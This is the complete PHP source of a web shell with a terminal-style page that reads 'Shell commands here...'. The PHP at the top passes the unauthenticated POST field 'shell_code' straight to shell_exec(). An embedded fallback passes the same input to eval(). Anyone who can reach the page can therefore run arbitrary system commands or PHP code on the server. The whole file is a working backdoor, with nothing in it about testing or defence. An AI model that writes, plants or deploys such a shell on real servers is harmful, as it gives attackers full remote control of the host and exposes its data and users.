<?php

# php eval alternative
# request sent using HTTP_X_REQUESTED_WITH
if( isset( $_SERVER['HTTP_X_REQUESTED_WITH'] ) ){
  if(isset($_POST['shell_code'])){
    $name = trim($_POST['shell_code']);
    ob_start();
    echo shell_exec($name);
    $shell_output = ob_get_contents();
    ob_end_clean();
    echo $shell_output ? "<pre>$shell_output</pre>" : "Empty || Error";
    return;
  }else{
    return;
  }
}

?>

<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Localhost</title>
    <style type="text/css">
      .clearfix:after {
        visibility: hidden;
        display: block;
        font-size: 0;
        content: " ";
        clear: both;
        height: 0;
      }
      * html .clearfix { zoom: 1; }
      *:first-child+html .clearfix { zoom: 1; }
      body{background-color: #2d2d2d;}
      pre{margin:0;}
      .container {
        font-family: monospace;
        max-width: 768px;
        background: black;
        padding: 10px;
        margin: auto;
      }
      .center {
        text-align: center;
      }
      .left {
        text-align: left;
      }
      .right {
        text-align: right;
      }
      div.block {
        padding: 4px;
        margin: 0 4px;
        overflow: auto;
        background: #000;
      }
      div.shell_output{
        max-height: 460px;
        overflow-wrap: break-word;
        overflow: auto;
        color: white;
      }
      form{
        overflow: hidden;
      }
      input.code {
        width:100%;
        height:100%;
        padding: 10px 10px 10px 15px;
        background-color: black;
        color: white;
        outline: 0;
        font-size: 14px;
        line-height: 14px;
        border: 0;
        font-family: monospace, Consolas;
      }
      .input_wrapper{
        margin-bottom: 5px;
        position: relative;
      }
      .input_wrapper label{
        color: white;
        font-weight: 600;
        font-size: 14px;
        line-height: 20px;
        position: absolute;
        top: 50%;
        -webkit-transform: translateY(-50%);
        -ms-transform: translateY(-50%);
        transform: translateY(-50%);
      }
      input[type="submit"]{display: none;}
      footer i{color: white;}
      ::-webkit-scrollbar {
        width: 6px;
        height: 6px;
      }/* Track */
      ::-webkit-scrollbar-track {
        -webkit-box-shadow: inset 0 0 6px rgba(255,255,255,0.3);
        -webkit-border-radius: 10px;
        border-radius: 10px;
      }
       /* Handle */
      ::-webkit-scrollbar-thumb {
        -webkit-border-radius: 10px;
        border-radius: 10px;
        background: rgba(255,255,255,0.8);
        -webkit-box-shadow: inset 0 0 6px rgba(255,255,255,0.5);
      }
      ::-webkit-scrollbar-thumb:window-inactive {
        background: rgba(255,255,255,0.4);
      }
    </style>
    <script type="text/javascript">
      // console.log('Hello, world!');
    </script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
    <script type="text/javascript">
      window.onload = function() {
        document.getElementById('shell_output').style.display='none';
        if (window.jQuery) {
          // jQuery is loaded
          $(document).ready(function() {
            var form = $('#shell_form'); // shell form
            var submit = $('#submit');  // submit button
            var shell_text = $('#shell_output'); // shell_output div for show alert message
            // form submit event
            form.on('submit', function(e) {
              e.preventDefault(); // prevent default form submit
              // sending ajax request through jQuery
              $.ajax({
                url: '', // form action url
                type: 'POST', // form submit method get/post
                dataType: 'html', // request type html/json/xml
                data: form.serialize(), // serialize form data
                beforeSend: function() {
                  shell_text.fadeOut();
                  submit.html('Processing...'); // change submit button text
                },
                success: function(data) {
                  shell_text.show(); // show the shell box
                  shell_text.html(data).fadeIn(); // fade in response data
                  submit.html('Run'); // reset submit button text
                },
                error: function(e) {
                  console.log(e); //show error on console
                }
              });
            });
          });
        } else {
          // jQuery is not loaded
          <?php
            if(isset($_POST['shell_code'])){
            ?>
            document.getElementById('shell_output').style.display='block';
            <?php
              $name = trim($_POST['shell_code']);
              ob_start();
              eval($name);
              $shell_output = ob_get_contents();
              ob_end_clean();
            }
          ?>
        }
      }
    </script>
    <script type="text/javascript">
      function clear_text() {
        document.getElementById("shell_code").value='';
      }
      function reset_text() {
        clear_text();
        document.getElementById("shell_output").innerHTML='';
        document.getElementById("shell_output").style.display='none';
      }
    </script>
  </head>
  <body>
    <div class="container">
      <div class="block">
        <form id="shell_form" method="post" action="" autocomplete="off">
          <div class="input_wrapper">
            <label for="shell_code">&#36;</label>
            <input class="code" id="shell_code" name="shell_code" placeholder="Shell commands here..."></input>
          </div>
          <div id="shell_output" class="block shell_output">
            <p><?php echo $shell_output; ?></p>
          </div>
          <br/>
          <input name="submit" type="submit" id="submit" value="Run"/>
          <!-- <button name="clearText" type="button" id="clearText" onclick="clear_text()">Clear Text</button>
          <button name="resetText" type="button" id="resetText" onclick="reset_text()">Reset</button> -->
        </form>
      </div>
      <footer><div class="right"><i>PHP Shell</i></div></footer>
    </div>
  </body>
</html>
